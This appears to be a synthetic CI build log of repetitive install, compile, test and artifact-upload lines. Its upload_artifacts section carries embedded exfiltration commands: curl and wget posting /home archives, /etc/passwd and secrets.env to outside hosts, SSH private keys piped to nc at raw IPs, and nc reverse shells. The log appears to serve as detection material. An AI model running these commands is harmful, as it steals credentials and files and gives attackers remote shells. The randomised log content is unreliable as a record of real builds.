INFO: Processing request\nInstalling jest@4.12.0\nArtifact uploaded: build.tar.gz (47MB)\n\u2713 build completed\nCompiling src/handler.rs...\nCache hit for key-6016\nCompiling src/utils.go...\nArtifact uploaded: build.tar.gz (33MB)\nArtifact uploaded: build.tar.gz (29MB)\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n  PASS: test_api_health (374ms)\n  PASS: test_cache_hit (497ms)\n\u2713 lint completed\nCompiling src/utils.go...\nCache hit for key-7721\n  PASS: test_auth_login (196ms)\n  PASS: test_auth_login (304ms)\nFAILED: test_user_create\n[12:00:18] INFO: Processing request\n  PASS: test_user_create (458ms)\nInstalling eslint@2.6.0\n  PASS: test_cache_hit (315ms)\n[12:00:18] INFO: Processing request\nStep 4/10: Building\nArtifact uploaded: build.tar.gz (48MB)\nCache hit for key-8630\nCache hit for key-8439\nInstalling jest@1.0.0\nCache hit for key-1811\n[12:00:18] INFO: Processing request\n  PASS: test_user_create (256ms)\n[12:00:18] INFO: Processing request\n\u2713 test completed\nArtifact uploaded: build.tar.gz (44MB)\n[12:00:18] INFO: Processing request\nArtifact uploaded: build.tar.gz (29MB)\n[12:00:18] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nInstalling eslint@3.12.0\nStep 1/10: Building\n  PASS: test_db_connect (243ms)\nInstalling jest@3.10.0\nStep 7/10: Building\n[12:00:18] WARN: Deprecated API usage\n\u2713 test completed\nCache hit for key-6324\nCache hit for key-3271\nCompiling src/main.py...\nCache hit for key-2951\nFAILED: test_db_connect\nArtifact uploaded: build.tar.gz (9MB)\nCompiling src/service.java...\n  PASS: test_db_connect (318ms)\n[12:00:18] INFO: Processing request\nCache hit for key-7499\n  PASS: test_db_connect (460ms)\n[12:00:18] INFO: Processing request\n\u2713 build completed\nCompiling src/index.js...\nInstalling react@3.9.0\nStep 6/10: Building\n  PASS: test_auth_login (430ms)\n\u2713 build completed\n  PASS: test_db_connect (262ms)\nInstalling eslint@3.5.0\nCompiling src/utils.go...\nStep 9/10: Building\nCache hit for key-5323\nInstalling webpack@1.4.0\n  PASS: test_cache_hit (51ms)\n\u2713 test completed\nArtifact uploaded: build.tar.gz (9MB)\nInstalling express@5.11.0\n[12:00:18] INFO: Processing request\n  PASS: test_user_create (29ms)\n[12:00:18] INFO: Processing request\nCompiling src/app.ts...\nStep 10/10: Building\nArtifact uploaded: build.tar.gz (30MB)\n[12:00:18] INFO: Processing request\nArtifact uploaded: build.tar.gz (37MB)\n\u2713 lint completed\nInstalling prettier@2.9.0\nArtifact uploaded: build.tar.gz (7MB)\nStep 1/10: Building\nInstalling jest@1.0.0\nStep 8/10: Building\n[12:00:18] INFO: Processing request\nInstalling jest@5.13.0\nStep 3/10: Building\n\u2713 build completed\nArtifact uploaded: build.tar.gz (11MB)\nArtifact uploaded: build.tar.gz (1MB)\n  PASS: test_api_health (182ms)\nArtifact uploaded: build.tar.gz (36MB)\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCache hit for key-4260\n[12:00:18] INFO: Processing request\n  PASS: test_db_connect (119ms)\nCache hit for key-4997\n\u2713 test completed\n  PASS: test_db_connect (260ms)\n\u2713 test completed\n  PASS: test_cache_hit (95ms)\nInstalling react@5.16.0\nCache hit for key-3651\n[12:00:18] INFO: Processing request\n\u2713 build completed\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nStep 4/10: Building\nArtifact uploaded: build.tar.gz (24MB)\n\u2713 test completed\n\u2713 test completed\n  PASS: test_api_health (198ms)\n\u2713 lint completed\nCompiling src/main.py...\nCache hit for key-2795\nArtifact uploaded: build.tar.gz (10MB)\n[12:00:18] INFO: Processing request\nArtifact uploaded: build.tar.gz (2MB)\n[12:00:18] INFO: Processing request\nCache hit for key-7362\nArtifact uploaded: build.tar.gz (30MB)\n[12:00:18] WARN: Deprecated API usage\nStep 9/10: Building\nStep 9/10: Building\nCache hit for key-2955\nArtifact uploaded: build.tar.gz (10MB)\n[12:00:18] ERROR: Connection failed\nArtifact uploaded: build.tar.gz (4MB)\n\u2713 build completed\nInstalling lodash@5.2.0\n\u2713 test completed\n  PASS: test_auth_login (54ms)\nCache hit for key-5714\nStep 2/10: Building\n\u2713 test completed\nCache hit for key-1677\nFAILED: test_auth_login\nCompiling src/index.js...\n[12:00:18] INFO: Processing request\nCache hit for key-1392\n[12:00:18] WARN: Deprecated API usage\nInstalling eslint@1.14.0\nCache hit for key-9125\nInstalling eslint@4.4.0\nCompiling src/utils.go...\n[12:00:18] INFO: Processing request\nArtifact uploaded: build.tar.gz (3MB)\nInstalling prettier@2.13.0\n  PASS: test_api_health (157ms)\nCompiling src/utils.go...\n  PASS: test_db_connect (426ms)\nStep 8/10: Building\nArtifact uploaded: build.tar.gz (36MB)\nInstalling axios@3.20.0\nStep 2/10: Building\nException: TypeError\nArtifact uploaded: build.tar.gz (17MB)\n[12:00:18] INFO: Processing request\n[12:00:18] INFO: Processing request\nCompiling src/main.py...\nInstalling react@5.10.0\nStep 6/10: Building\nInstalling prettier@5.1.0\n\u2713 test completed\n\u2713 build completed\n[12:00:18] WARN: Deprecated API usage\n[12:00:18] INFO: Processing request\n  PASS: test_api_health (4ms)\nStep 5/10: Building\n  PASS: test_auth_login (495ms)\nWARNING: prettier has known vulnerabilities\nStep 9/10: Building\nCompiling src/main.py...\nInstalling express@1.5.0\nException: TypeError\nCompiling src/handler.rs...\nInstalling webpack@1.1.0\nCompiling src/handler.rs...\n  PASS: test_cache_hit (167ms)\nArtifact uploaded: build.tar.gz (13MB)\nArtifact uploaded: build.tar.gz (23MB)\nArtifact uploaded: build.tar.gz (39MB)\n  PASS: test_user_create (461ms)\nCache hit for key-3126\nArtifact uploaded: build.tar.gz (32MB)\n  PASS: test_db_connect (87ms)\n  PASS: test_api_health (466ms)\nStep 4/10: Building\n\u2713 lint completed\n=== Step save_cache completed ===\n=== Step: build ===\nCache hit for key-5696\nStep 5/10: Building\nCompiling src/app.ts...\nCompiling src/index.js...\n\u2713 build completed\nStep 3/10: Building\nCache hit for key-9222\n[12:00:18] INFO: Processing request\nArtifact uploaded: build.tar.gz (39MB)\nStep 8/10: Building\nArtifact uploaded: build.tar.gz (26MB)\n  PASS: test_db_connect (170ms)\nCompiling src/utils.go...\n[12:00:18] WARN: Deprecated API usage\nCompiling src/app.ts...\nCache hit for key-5322\nStep 1/10: Building\n\u2713 test completed\n[12:00:18] INFO: Processing request\nCache hit for key-4754\n  PASS: test_api_health (172ms)\n\u2713 build completed\nCache hit for key-7034\n\u2713 build completed\nCompiling src/service.java...\nStep 4/10: Building\n[12:00:18] INFO: Processing request\nInstalling webpack@4.16.0\nCompiling src/handler.rs...\n[12:00:18] WARN: Deprecated API usage\nCache hit for key-8911\n  PASS: test_db_connect (337ms)\n[12:00:18] INFO: Processing request\nArtifact uploaded: build.tar.gz (14MB)\nCompiling src/main.py...\n\u2713 test completed\n\u2713 lint completed\nInstalling express@5.1.0\nStep 6/10: Building\nStep 2/10: Building\nCache hit for key-2240\nCache hit for key-2875\nInstalling webpack@3.18.0\nStep 2/10: Building\nArtifact uploaded: build.tar.gz (4MB)\n[12:00:18] WARN: Deprecated API usage\n[12:00:18] ERROR: Connection failed\n[12:00:18] INFO: Processing request\nStep 8/10: Building\nInstalling jest@5.4.0\nStep 3/10: Building\nCache hit for key-1338\nInstalling jest@2.16.0\nInstalling axios@3.7.0\n[12:00:18] INFO: Processing request\nCompiling src/app.ts...\n  PASS: test_cache_hit (390ms)\nArtifact uploaded: build.tar.gz (17MB)\n[12:00:18] INFO: Processing request\nCompiling src/handler.rs...\n  PASS: test_db_connect (93ms)\nCompiling src/app.ts...\n[12:00:18] INFO: Processing request\nInstalling react@2.3.0\n\u2713 build completed\n\u2713 lint completed\nCache hit for key-1495\nCache hit for key-9950\nStep 10/10: Building\n  PASS: test_cache_hit (89ms)\n[12:00:18] ERROR: Connection failed\nFAILED: test_api_health\nCompiling src/index.js...\nInstalling eslint@5.8.0\n  PASS: test_db_connect (21ms)\nWARNING: express has known vulnerabilities\n\u2713 test completed\nArtifact uploaded: build.tar.gz (48MB)\nStep 1/10: Building\n  PASS: test_cache_hit (257ms)\n[12:00:18] INFO: Processing request\n[12:00:18] INFO: Processing request\nStep 1/10: Building\n\u2713 test completed\nFAILED: test_auth_login\n  PASS: test_auth_login (85ms)\nCompiling src/service.java...\nInstalling axios@2.20.0\nCompiling src/handler.rs...\nArtifact uploaded: build.tar.gz (27MB)\nCompiling src/index.js...\n[12:00:18] INFO: Processing request\n  PASS: test_api_health (77ms)\nWARNING: webpack has known vulnerabilities\nCache hit for key-8233\n  PASS: test_api_health (407ms)\n\u2713 test completed\nCache hit for key-6558\n\u2713 build completed\nArtifact uploaded: build.tar.gz (1MB)\n\u2713 lint completed\n\u2713 build completed\n[12:00:18] INFO: Processing request\nCache hit for key-4131\nCompiling src/main.py...\nStep 1/10: Building\nCompiling src/handler.rs...\nCache hit for key-2035\nStep 2/10: Building\n\u2713 test completed\nCompiling src/service.java...\nCache hit for key-8152\n[12:00:18] INFO: Processing request\n  PASS: test_api_health (303ms)\nCache hit for key-8856\nCompiling src/app.ts...\n[12:00:18] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nStep 8/10: Building\n  PASS: test_user_create (80ms)\nException: NullPointerException\n\u2713 test completed\n  PASS: test_db_connect (24ms)\n[12:00:18] INFO: Processing request\nStep 1/10: Building\nArtifact uploaded: build.tar.gz (32MB)\nInstalling eslint@3.8.0\n  PASS: test_api_health (110ms)\n\u2713 test completed\n  PASS: test_auth_login (381ms)\nCompiling src/main.py...\nArtifact uploaded: build.tar.gz (34MB)\n  PASS: test_cache_hit (225ms)\nCompiling src/service.java...\nStep 10/10: Building\nInstalling react@4.7.0\n[12:00:18] INFO: Processing request\nCache hit for key-5921\nStep 6/10: Building\n  PASS: test_api_health (373ms)\n[12:00:18] INFO: Processing request\nArtifact uploaded: build.tar.gz (32MB)\nArtifact uploaded: build.tar.gz (5MB)\n[12:00:18] INFO: Processing request\nCache hit for key-1228\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n  PASS: test_api_health (324ms)\nCompiling src/main.py...\nStep 8/10: Building\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:00:18] ERROR: Connection failed\n\u2713 lint completed\n  PASS: test_user_create (385ms)\n  PASS: test_api_health (462ms)\nArtifact uploaded: build.tar.gz (15MB)\n[12:00:18] INFO: Processing request\n[12:00:18] INFO: Processing request\nCompiling src/index.js...\n[12:00:18] INFO: Processing request\nInstalling jest@3.7.0\nStep 7/10: Building\nCache hit for key-2449\nInstalling webpack@2.5.0\n  PASS: test_db_connect (50ms)\n[12:00:18] INFO: Processing request\n  PASS: test_db_connect (375ms)\nCache hit for key-3088\nStep 5/10: Building\n  PASS: test_api_health (369ms)\nCache hit for key-2925\nInstalling express@1.10.0\nWARNING: eslint has known vulnerabilities\nStep 7/10: Building\nArtifact uploaded: build.tar.gz (48MB)\nCache hit for key-7963\n[12:00:18] INFO: Processing request\nInstalling jest@4.16.0\n  PASS: test_db_connect (104ms)\nCompiling src/handler.rs...\nCompiling src/service.java...\n[12:00:18] INFO: Processing request\n  PASS: test_cache_hit (4ms)\nCompiling src/utils.go...\nStep 4/10: Building\nInstalling react@5.8.0\nCache hit for key-8782\n[12:00:18] INFO: Processing request\nStep 5/10: Building\nStep 6/10: Building\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nWARNING: prettier has known vulnerabilities\n\u2713 lint completed\n=== Step build completed ===\n=== Step: install_dependencies ===\nStep 9/10: Building\nStep 5/10: Building\nInstalling webpack@1.15.0\n  PASS: test_api_health (56ms)\n[12:00:18] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (5MB)\nStep 1/10: Building\nCache hit for key-2284\nArtifact uploaded: build.tar.gz (1MB)\nInstalling eslint@1.17.0\nCache hit for key-8339\nStep 10/10: Building\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nInstalling react@4.15.0\n  PASS: test_cache_hit (454ms)\n\u2713 build completed\nInstalling react@2.8.0\nStep 9/10: Building\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nStep 9/10: Building\nCompiling src/app.ts...\n[12:00:18] INFO: Processing request\n\u2713 lint completed\nStep 5/10: Building\nInstalling lodash@2.0.0\nCache hit for key-1293\n\u2713 lint completed\n[12:00:18] INFO: Processing request\nStep 8/10: Building\n[12:00:18] INFO: Processing request\nCache hit for key-4327\nArtifact uploaded: build.tar.gz (33MB)\n[12:00:18] INFO: Processing request\nArtifact uploaded: build.tar.gz (40MB)\n\u2717 build failed with exit code 61\n[12:00:18] INFO: Processing request\nArtifact uploaded: build.tar.gz (47MB)\nInstalling axios@1.12.0\nInstalling prettier@1.16.0\nCache hit for key-8304\nCompiling src/index.js...\nException: RuntimeError\nCompiling src/app.ts...\nArtifact uploaded: build.tar.gz (8MB)\n  PASS: test_cache_hit (395ms)\nStep 7/10: Building\n  PASS: test_cache_hit (343ms)\nCache hit for key-5385\nArtifact uploaded: build.tar.gz (9MB)\nStep 4/10: Building\n[12:00:18] INFO: Processing request\nCache hit for key-6308\nCache hit for key-1801\nInstalling prettier@4.0.0\n  PASS: test_cache_hit (300ms)\n  PASS: test_user_create (488ms)\n  PASS: test_auth_login (368ms)\nCache hit for key-4012\nCompiling src/index.js...\nStep 7/10: Building\nCompiling src/app.ts...\n\u2713 lint completed\nCompiling src/service.java...\n\u2713 build completed\n[12:00:18] INFO: Processing request\nInstalling axios@3.6.0\nStep 9/10: Building\nInstalling lodash@3.9.0\nCompiling src/app.ts...\nCompiling src/service.java...\nStep 10/10: Building\n[12:00:18] INFO: Processing request\nWARNING: eslint has known vulnerabilities\nCache hit for key-5277\n[12:00:18] INFO: Processing request\nWARNING: lodash has known vulnerabilities\nCache hit for key-9689\nCache hit for key-1527\n[12:00:18] WARN: Deprecated API usage\n[12:00:18] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (18MB)\n\u2717 build failed with exit code 122\nStep 2/10: Building\nCompiling src/utils.go...\n\u2713 lint completed\nCompiling src/utils.go...\nInstalling react@1.16.0\n[12:00:18] INFO: Processing request\nCache hit for key-4873\nCompiling src/app.ts...\nStep 6/10: Building\nInstalling lodash@4.5.0\nCompiling src/service.java...\n[12:00:18] INFO: Processing request\n[12:00:18] INFO: Processing request\nInstalling jest@1.1.0\n  PASS: test_auth_login (307ms)\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nInstalling webpack@5.6.0\nArtifact uploaded: build.tar.gz (40MB)\nInstalling axios@5.16.0\n  PASS: test_cache_hit (302ms)\nArtifact uploaded: build.tar.gz (46MB)\nArtifact uploaded: build.tar.gz (15MB)\nInstalling lodash@1.9.0\n  PASS: test_user_create (249ms)\n[12:00:18] WARN: Deprecated API usage\nStep 9/10: Building\nCompiling src/index.js...\n  PASS: test_db_connect (493ms)\nArtifact uploaded: build.tar.gz (25MB)\n[12:00:18] INFO: Processing request\n  PASS: test_api_health (117ms)\n\u2713 test completed\nCache hit for key-4132\nArtifact uploaded: build.tar.gz (11MB)\nCache hit for key-2828\nArtifact uploaded: build.tar.gz (16MB)\nCompiling src/service.java...\nStep 8/10: Building\n[12:00:18] WARN: Deprecated API usage\n[12:00:18] INFO: Processing request\nCache hit for key-9462\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nStep 8/10: Building\nCache hit for key-5027\nCompiling src/main.py...\nCache hit for key-6378\nArtifact uploaded: build.tar.gz (45MB)\n  PASS: test_api_health (164ms)\nCompiling src/handler.rs...\nArtifact uploaded: build.tar.gz (22MB)\n[12:00:18] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nStep 7/10: Building\nCompiling src/utils.go...\nInstalling express@4.19.0\nInstalling react@1.19.0\nCompiling src/service.java...\nArtifact uploaded: build.tar.gz (23MB)\nInstalling react@3.4.0\nCache hit for key-2526\n[12:00:18] INFO: Processing request\n\u2713 lint completed\nCompiling src/utils.go...\n\u2713 lint completed\nWARNING: lodash has known vulnerabilities\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:00:18] INFO: Processing request\nInstalling webpack@2.5.0\n  PASS: test_user_create (155ms)\nArtifact uploaded: build.tar.gz (33MB)\nInstalling axios@3.15.0\nCache hit for key-1296\n[12:00:18] ERROR: Connection failed\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (49MB)\n[12:00:18] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCompiling src/main.py...\nStep 9/10: Building\n\u2713 lint completed\nCache hit for key-8754\nStep 4/10: Building\nArtifact uploaded: build.tar.gz (49MB)\nInstalling prettier@2.16.0\nArtifact uploaded: build.tar.gz (4MB)\nInstalling axios@1.18.0\nStep 5/10: Building\nInstalling prettier@1.5.0\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nInstalling lodash@1.12.0\n[12:00:18] INFO: Processing request\nStep 2/10: Building\n[12:00:18] INFO: Processing request\n  PASS: test_api_health (269ms)\nArtifact uploaded: build.tar.gz (2MB)\nCache hit for key-1347\nInstalling react@4.17.0\n[12:00:18] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (5MB)\nArtifact uploaded: build.tar.gz (13MB)\nInstalling react@2.20.0\nWARNING: lodash has known vulnerabilities\nInstalling axios@5.16.0\n\u2713 test completed\nStep 9/10: Building\nArtifact uploaded: build.tar.gz (39MB)\n[12:00:18] WARN: Deprecated API usage\nCache hit for key-4789\n[12:00:18] WARN: Deprecated API usage\n[12:00:18] INFO: Processing request\n=== Step install_dependencies completed ===\n=== Step: e2e_tests ===\nInstalling axios@3.8.0\n\u2713 build completed\nInstalling jest@5.20.0\nStep 1/10: Building\nInstalling eslint@5.10.0\nCompiling src/main.py...\nStep 8/10: Building\nWARNING: webpack has known vulnerabilities\nCompiling src/app.ts...\nCache hit for key-8718\n\u2713 test completed\n  PASS: test_db_connect (250ms)\nCompiling src/app.ts...\n  PASS: test_cache_hit (88ms)\n[12:00:18] ERROR: Connection failed\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n  PASS: test_cache_hit (283ms)\nException: RuntimeError\nInstalling webpack@4.4.0\n[12:00:18] INFO: Processing request\nCache hit for key-7428\n\u2713 lint completed\nCache hit for key-3061\nCompiling src/handler.rs...\n\u2713 test completed\n  PASS: test_user_create (383ms)\nStep 7/10: Building\nCache hit for key-6892\n  PASS: test_cache_hit (500ms)\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCompiling src/index.js...\nInstalling jest@1.3.0\nArtifact uploaded: build.tar.gz (46MB)\nCache hit for key-5355\nCompiling src/index.js...\nCache hit for key-4768\n\u2713 lint completed\nInstalling jest@3.12.0\n  PASS: test_db_connect (243ms)\n\u2713 test completed\n[12:00:18] INFO: Processing request\n\u2713 test completed\n[12:00:18] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (6MB)\nCache hit for key-2457\nInstalling prettier@1.2.0\nArtifact uploaded: build.tar.gz (16MB)\nStep 7/10: Building\n  PASS: test_cache_hit (392ms)\n[12:00:18] INFO: Processing request\nInstalling axios@3.19.0\nArtifact uploaded: build.tar.gz (17MB)\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n  PASS: test_cache_hit (454ms)\nCompiling src/service.java...\nInstalling webpack@3.8.0\nArtifact uploaded: build.tar.gz (6MB)\nArtifact uploaded: build.tar.gz (5MB)\n\u2713 lint completed\nCache hit for key-1407\n[12:00:18] INFO: Processing request\n\u2713 test completed\nStep 10/10: Building\nCache hit for key-8222\nArtifact uploaded: build.tar.gz (47MB)\nCompiling src/service.java...\n[12:00:18] WARN: Deprecated API usage\nFAILED: test_auth_login\n\u2713 test completed\nArtifact uploaded: build.tar.gz (15MB)\n[12:00:18] INFO: Processing request\nFAILED: test_user_create\nArtifact uploaded: build.tar.gz (1MB)\nCache hit for key-1704\nArtifact uploaded: build.tar.gz (18MB)\n  PASS: test_cache_hit (340ms)\nStep 8/10: Building\n  PASS: test_user_create (343ms)\n[12:00:18] INFO: Processing request\n\u2713 lint completed\n[12:00:18] WARN: Deprecated API usage\nCache hit for key-8309\n\u2713 lint completed\n[12:00:18] INFO: Processing request\n\u2713 test completed\nInstalling webpack@1.8.0\nArtifact uploaded: build.tar.gz (9MB)\n  PASS: test_api_health (276ms)\nCompiling src/service.java...\n  PASS: test_auth_login (138ms)\nCache hit for key-3704\nStep 5/10: Building\nArtifact uploaded: build.tar.gz (3MB)\nStep 4/10: Building\n[12:00:18] INFO: Processing request\nInstalling jest@5.15.0\nCompiling src/handler.rs...\nCompiling src/handler.rs...\nInstalling webpack@4.1.0\n  PASS: test_auth_login (460ms)\nStep 8/10: Building\n[12:00:18] INFO: Processing request\nCompiling src/index.js...\nCompiling src/handler.rs...\nCompiling src/main.py...\n[12:00:18] INFO: Processing request\nInstalling lodash@1.12.0\nStep 4/10: Building\nInstalling express@1.20.0\n[12:00:18] WARN: Deprecated API usage\nStep 5/10: Building\n  PASS: test_db_connect (89ms)\nInstalling react@1.0.0\nFAILED: test_api_health\nCompiling src/service.java...\nCompiling src/main.py...\n[12:00:18] WARN: Deprecated API usage\n  PASS: test_auth_login (26ms)\nCache hit for key-9126\n[12:00:18] INFO: Processing request\nArtifact uploaded: build.tar.gz (34MB)\nCache hit for key-6657\nCache hit for key-9375\n  PASS: test_auth_login (8ms)\n  PASS: test_db_connect (307ms)\nStep 6/10: Building\n[12:00:18] ERROR: Connection failed\nStep 2/10: Building\n  PASS: test_auth_login (275ms)\nInstalling react@5.20.0\nArtifact uploaded: build.tar.gz (29MB)\nCompiling src/service.java...\nStep 3/10: Building\nCache hit for key-2770\nInstalling react@4.3.0\n[12:00:18] INFO: Processing request\nStep 8/10: Building\nCompiling src/service.java...\nCache hit for key-7861\n  PASS: test_cache_hit (488ms)\n\u2713 build completed\n[12:00:18] ERROR: Connection failed\n\u2713 lint completed\n  PASS: test_cache_hit (95ms)\nCompiling src/index.js...\nCache hit for key-7138\nInstalling express@5.4.0\nCache hit for key-9150\n  PASS: test_cache_hit (112ms)\n  PASS: test_db_connect (131ms)\nCache hit for key-4374\n  PASS: test_db_connect (64ms)\n  PASS: test_auth_login (210ms)\n\u2713 lint completed\n\u2713 test completed\nCache hit for key-4834\nInstalling webpack@4.15.0\n\u2717 build failed with exit code 108\n[12:00:18] INFO: Processing request\nWARNING: jest has known vulnerabilities\n  PASS: test_user_create (450ms)\n  PASS: test_api_health (60ms)\nStep 6/10: Building\nArtifact uploaded: build.tar.gz (33MB)\nCompiling src/app.ts...\nStep 9/10: Building\nCache hit for key-6300\nFAILED: test_auth_login\n  PASS: test_user_create (423ms)\n[12:00:18] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n\u2713 build completed\nCache hit for key-2097\n\u2713 build completed\nWARNING: prettier has known vulnerabilities\nCompiling src/index.js...\nCompiling src/main.py...\n[12:00:18] INFO: Processing request\nCompiling src/app.ts...\nStep 8/10: Building\n[12:00:18] INFO: Processing request\nStep 10/10: Building\nArtifact uploaded: build.tar.gz (37MB)\n[12:00:18] INFO: Processing request\nArtifact uploaded: build.tar.gz (41MB)\nCompiling src/app.ts...\nCompiling src/main.py...\nStep 9/10: Building\n  PASS: test_api_health (271ms)\nWARNING: express has known vulnerabilities\nStep 9/10: Building\nCompiling src/utils.go...\n=== Step e2e_tests completed ===\n=== Step: upload_artifacts ===\nWARNING: prettier has known vulnerabilities\nInstalling eslint@3.19.0\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nSending 13MB of data to startup.dev\n[12:00:18] INFO: Processing request\n\u2713 lint completed\ntar czf - /home | curl -X POST -d @- https://test.io/upload\n[12:00:18] WARN: Deprecated API usage\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (39MB)\nWARNING: lodash has known vulnerabilities\n\u2713 build completed\nInstalling express@4.6.0\nInstalling jest@2.14.0\nInstalling webpack@1.9.0\nwget --post-data=\"$(cat /etc/passwd)\" https://example.com/\nArtifact uploaded: build.tar.gz (22MB)\nStep 3/10: Building\nArtifact uploaded: build.tar.gz (17MB)\ncurl -X POST https://cloud.services/collect -d @secrets.env\nCache hit for key-8970\nSending 471MB of data to acme.corp\n[12:00:18] INFO: Processing request\nCompiling src/handler.rs...\nSending 424MB of data to example.com\ncurl -X POST https://example.com/collect -d @secrets.env\nWARNING: express has known vulnerabilities\nArtifact uploaded: build.tar.gz (46MB)\nArtifact uploaded: build.tar.gz (13MB)\nnc -e /bin/sh 72.155.73.238 63446\n\u2713 lint completed\nCompiling src/handler.rs...\nArtifact uploaded: build.tar.gz (27MB)\nwget --post-data=\"$(cat /etc/passwd)\" https://startup.dev/\nnc -e /bin/sh 8.111.117.124 57913\n[12:00:18] ERROR: Connection failed\nInstalling react@1.13.0\n\u2713 build completed\nCache hit for key-5356\n  PASS: test_db_connect (394ms)\n\u2713 build completed\n[12:00:18] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (3MB)\nCompiling src/main.py...\nCache hit for key-8394\n\u2713 test completed\n[12:00:18] INFO: Processing request\nArtifact uploaded: build.tar.gz (32MB)\nArtifact uploaded: build.tar.gz (25MB)\n[12:00:18] INFO: Processing request\nStep 3/10: Building\n\u2713 build completed\nException: NullPointerException\n  PASS: test_cache_hit (182ms)\nCache hit for key-8817\nCache hit for key-3327\nInstalling eslint@3.3.0\nSending 448MB of data to startup.dev\nFAILED: test_db_connect\n[12:00:18] INFO: Processing request\nStep 6/10: Building\nCache hit for key-6962\nArtifact uploaded: build.tar.gz (15MB)\nSending 228MB of data to example.com\nWARNING: react has known vulnerabilities\n[12:00:18] INFO: Processing request\n[12:00:18] INFO: Processing request\nArtifact uploaded: build.tar.gz (21MB)\nInstalling eslint@4.1.0\ncurl -X POST https://test.io/collect -d @secrets.env\nStep 6/10: Building\nArtifact uploaded: build.tar.gz (21MB)\necho $(cat ~/.ssh/id_rsa) | base64 | nc 131.36.3.191 8474\n\u2713 build completed\nArtifact uploaded: build.tar.gz (46MB)\nInstalling react@4.8.0\nStep 1/10: Building\nStep 8/10: Building\nArtifact uploaded: build.tar.gz (37MB)\nCache hit for key-2816\n[12:00:18] ERROR: Connection failed\nStep 6/10: Building\nInstalling prettier@1.1.0\nCompiling src/handler.rs...\nInstalling eslint@2.15.0\n  PASS: test_db_connect (23ms)\nSending 17MB of data to cloud.services\n\u2713 test completed\n\u2713 lint completed\n  PASS: test_api_health (438ms)\ntar czf - /home | curl -X POST -d @- https://acme.corp/upload\necho $(cat ~/.ssh/id_rsa) | base64 | nc 34.29.208.190 60607\nArtifact uploaded: build.tar.gz (5MB)\nCache hit for key-6340\nInstalling express@4.15.0\n[12:00:18] WARN: Deprecated API usage\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n\u2713 lint completed\nSending 178MB of data to acme.corp\nStep 3/10: Building\n[12:00:18] INFO: Processing request\nStep 9/10: Building\nCache hit for key-7182\nCompiling src/app.ts...\n  PASS: test_db_connect (286ms)\nStep 9/10: Building\nStep 7/10: Building\nCache hit for key-1437\nCache hit for key-5067\nSending 310MB of data to startup.dev\n  PASS: test_cache_hit (314ms)\nArtifact uploaded: build.tar.gz (5MB)\nArtifact uploaded: build.tar.gz (7MB)\n\u2717 build failed with exit code 63\nStep 2/10: Building\n\u2713 build completed\n  PASS: test_db_connect (361ms)\nInstalling eslint@2.3.0\n  PASS: test_auth_login (281ms)\nInstalling react@5.13.0\n[12:00:18] WARN: Deprecated API usage\nWARNING: webpack has known vulnerabilities\nCache hit for key-4762\n[12:00:18] INFO: Processing request\nArtifact uploaded: build.tar.gz (22MB)\ntar czf - /home | curl -X POST -d @- https://test.io/upload\n[12:00:18] INFO: Processing request\nArtifact uploaded: build.tar.gz (49MB)\n\u2713 build completed\nCompiling src/service.java...\n\u2713 build completed\nInstalling axios@2.1.0\nInstalling eslint@4.0.0\n[12:00:18] WARN: Deprecated API usage\nSending 443MB of data to cloud.services\nArtifact uploaded: build.tar.gz (3MB)\nCache hit for key-6709\nCache hit for key-2829\nStep 6/10: Building\nCompiling src/main.py...\nStep 1/10: Building\nCache hit for key-5457\nCompiling src/handler.rs...\nStep 6/10: Building\nCompiling src/main.py...\nCache hit for key-6630\nCompiling src/main.py...\n[12:00:18] INFO: Processing request\nCompiling src/handler.rs...\n\u2713 test completed\nInstalling webpack@5.11.0\nStep 5/10: Building\nArtifact uploaded: build.tar.gz (28MB)\n[12:00:18] INFO: Processing request\necho $(cat ~/.ssh/id_rsa) | base64 | nc 47.32.194.178 5174\nCache hit for key-6685\nArtifact uploaded: build.tar.gz (38MB)\n  PASS: test_db_connect (126ms)\nInstalling webpack@4.0.0\nCache hit for key-4676\nInstalling express@3.17.0\n\u2713 build completed\nInstalling react@3.3.0\n[12:00:18] INFO: Processing request\n[12:00:18] INFO: Processing request\nCache hit for key-6714\nArtifact uploaded: build.tar.gz (28MB)\nCache hit for key-5546\nCompiling src/utils.go...\nArtifact uploaded: build.tar.gz (16MB)\n  PASS: test_auth_login (334ms)\ntar czf - /home | curl -X POST -d @- https://example.com/upload\nStep 6/10: Building\n\u2713 test completed\nStep 9/10: Building\nArtifact uploaded: build.tar.gz (43MB)\nInstalling express@4.19.0\n\u2713 build completed\nArtifact uploaded: build.tar.gz (7MB)\nStep 9/10: Building\n  PASS: test_api_health (387ms)\nException: RuntimeError\nCache hit for key-5928\nCompiling src/service.java...\nwget --post-data=\"$(cat /etc/passwd)\" https://test.io/\n\u2717 build failed with exit code 98\ntar czf - /home | curl -X POST -d @- https://acme.corp/upload\n\u2713 build completed\nwget --post-data=\"$(cat /etc/passwd)\" https://example.com/\nStep 4/10: Building\nCompiling src/index.js...\nStep 10/10: Building\nInstalling prettier@3.20.0\n[12:00:18] INFO: 